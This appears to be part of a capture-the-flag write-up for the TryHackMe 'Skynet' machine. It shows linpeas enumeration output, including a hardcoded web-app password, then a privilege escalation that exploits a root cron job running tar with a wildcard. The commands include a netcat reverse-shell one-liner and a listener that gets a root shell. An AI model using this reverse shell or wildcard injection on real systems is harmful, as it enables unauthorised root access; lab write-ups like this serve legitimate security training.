+/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
+/var/log/bootstrap.log:Selecting previously unselected package passwd.
+/var/log/bootstrap.log:Setting up base-passwd (3.5.39) ...
+/var/log/bootstrap.log:Setting up passwd (1:4.2-3.1ubuntu5) ...
+/var/log/bootstrap.log:Shadow passwords are now on.
+/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) ...
+/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) over (3.5.39) ...
+/var/log/bootstrap.log:Unpacking passwd (1:4.2-3.1ubuntu5) ...
+/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
+/var/log/dpkg.log:2019-02-26 23:58:11 configure base-passwd:amd64 3.5.39 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:11 install base-passwd:amd64 <none> 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:11 status half-configured base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:11 status half-installed base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:11 status installed base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:11 status unpacked base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:13 status half-configured base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:13 status half-installed base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:13 status unpacked base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:13 upgrade base-passwd:amd64 3.5.39 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:19 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2019-02-26 23:58:19 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2019-02-26 23:58:19 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2019-02-26 23:58:22 configure base-passwd:amd64 3.5.39 <none>
+/var/log/dpkg.log:2019-02-26 23:58:22 status half-configured base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:22 status installed base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:22 status unpacked base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2019-02-26 23:58:28 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
+/var/log/dpkg.log:2019-02-26 23:58:28 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2019-02-26 23:58:28 status installed passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2019-02-26 23:58:28 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2019-02-26 23:59:08 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2019-02-26 23:59:08 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2019-02-26 23:59:08 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
+/var/log/dpkg.log:2019-02-26 23:59:08 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
+/var/log/dpkg.log:2019-02-26 23:59:08 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
+/var/log/dpkg.log:2019-02-26 23:59:09 configure passwd:amd64 1:4.2-3.1ubuntu5.3 <none>
+/var/log/dpkg.log:2019-02-26 23:59:09 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.3
+/var/log/dpkg.log:2019-02-26 23:59:09 status installed passwd:amd64 1:4.2-3.1ubuntu5.3
+/var/log/dpkg.log:2019-02-26 23:59:09 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
+/var/log/installer/status:Description: Set up users and passwords
+
+[+] Finding emails inside logs (limit 70)
+     58 /var/log/installer/status:ubuntu-devel-discuss@lists.ubuntu.com
+     28 /var/log/installer/status:ubuntu-installer@lists.ubuntu.com
+     17 /var/log/installer/status:kernel-team@lists.ubuntu.com
+      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding 'pwd' or 'passw' variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/acpi/powerbtn.sh:                userhome=`getent passwd $user | cut -d: -f6`
+/etc/bash_completion.d/grub:__grub_mkpasswd_pbkdf2_program="grub-mkpasswd-pbkdf2"
+/etc/nsswitch.conf:passwd:         compat
+/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
+/etc/php/5.6/apache2/php.ini:; Define the anonymous ftp password (your email address). PHP's default setting
+/etc/php/5.6/cgi/php.ini:; Define the anonymous ftp password (your email address). PHP's default setting
+/etc/php/5.6/cli/php.ini:; Define the anonymous ftp password (your email address). PHP's default setting
+/etc/php/7.3/cli/php.ini:; Define the anonymous ftp password (your email address). PHP's default setting
+/etc/samba/smb.conf:   pam password change = yes
+/etc/samba/smb.conf:   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
+/etc/samba/smb.conf:   passwd program = /usr/bin/passwd %u
+/etc/samba/smb.conf:   unix password sync = yes
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/squirrelmail/conf.pl:            print "Enter password:";
+/etc/ssl/openssl.cnf:challengePassword		= A challenge password
+/etc/ssl/openssl.cnf:challengePassword_max		= 20
+/etc/ssl/openssl.cnf:challengePassword_min		= 4
+/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \
+/tmp/linpeas.sh:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
+/tmp/linpeas.sh:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
+/tmp/linpeas.sh:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
+/tmp/linpeas.sh:    printf $Y"[+] "$GREEN"Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
+/tmp/linpeas.sh:  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
+/tmp/linpeas.sh:  PASSWORDTRY=$2
+/tmp/linpeas.sh:  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
+/var/backups/dpkg.status.0:Depends: adduser, passwd, init-system-helpers (>= 1.18~), libc6 (>= 2.14), libsystemd0
+/var/backups/dpkg.status.0:Depends: base-passwd (>= 3.0.4)
+/var/backups/dpkg.status.0:Depends: passwd, libc6 (>= 2.4)
+/var/backups/dpkg.status.0:Depends: perl-base (>= 5.6.0), passwd (>= 1:4.1.5.1-1.1ubuntu6), debconf | debconf-2.0
+/var/www/html/45kra24zxs28v3yd/administrator/Configuration.php:		public $password = "password123";
+/var/www/html/45kra24zxs28v3yd/administrator/classes/DataBase.php:		public $password = "";
+/var/www/html/45kra24zxs28v3yd/administrator/classes/User.php:		public function CreateUserSession($user, $password, $access_type = "admin_login"){
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/tiny_mce_src.js:			return "password" === elem.type;
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/tiny_mce_src.js:		password: function(elem){
+
+[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/langs/en_dlg.js:accesskey:"Accesskey",
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/langs/en_dlg.js:attribute_label_accesskey:"AccessKey",
+
+[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/dovecot/conf.d/auth-passwdfile.conf.ext:  args = scheme=CRYPT username_format=%u /etc/dovecot/users
+/etc/dovecot/conf.d/auth-passwdfile.conf.ext:  args = username_format=%u /etc/dovecot/users
+/etc/squirrelmail/conf.pl:            $force_username_lowercase       = false;
+/etc/squirrelmail/conf.pl:            $force_username_lowercase       = true;
+/etc/squirrelmail/conf.pl:            elsif ( $command == 5 )  { $force_username_lowercase = command35(); }
+/etc/squirrelmail/conf.pl:        print "    Remove username from header  : $WHT$hide_auth_header$NRM\n";
+/etc/squirrelmail/conf.pl:        print "5.  Field for username     : $WHT$prefs_user_field$NRM\n";
+/etc/squirrelmail/conf.pl:        print "5.  Usernames in Lowercase       : $WHT$force_username_lowercase$NRM\n";
+/etc/squirrelmail/conf.pl:        print "Enter username [$smtp_sitewide_user]:";
+/etc/squirrelmail/conf.pl:        print CF "\$force_username_lowercase = $force_username_lowercase;\n";
+/etc/squirrelmail/conf.pl:    print "Convert usernames to lowercase (y/n) [$WHT$default_value$NRM]: $WHT";
+/etc/squirrelmail/conf.pl:    print "Remove username from email headers? (y/n) [$WHT$default_value$NRM]: $WHT";
+/etc/squirrelmail/conf.pl:$force_username_lowercase = "false"    if ( !$force_username_lowercase );
+/etc/squirrelmail/config.php:$force_username_lowercase = false;
+/etc/squirrelmail/config_default.php:$force_username_lowercase = false;
+/tmp/linpeas.sh:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
+/var/www/html/45kra24zxs28v3yd/administrator/classes/User.php:				$_SESSION["username"] = $result[0]["username"];
+
+[+] Looking for specific hashes inside files - less false positives (limit 70)
+
+REVIEW CRONTAB
+$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+$ cat /home/milesdyson/backups/backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+
+EXPLOIT WILDCARD VIA TAR COMMAND IN BACKUP SCRIPT
+$ cd /var/www/html
+$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.10.169 4444 >/tmp/f" > shell.sh
+
+GET ROOT SHELL ONCE CRONTAB SCRIPT RUNS
+root@kali:~/tryhackme/skynet# nc -lvp 4444
+listening on [any] 4444 ...
+10.10.209.240: inverse host lookup failed: Unknown host
+connect to [10.11.10.169] from (UNKNOWN) [10.10.166.138] 46120
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+####################################
+# 
+
+
+
+
+
+
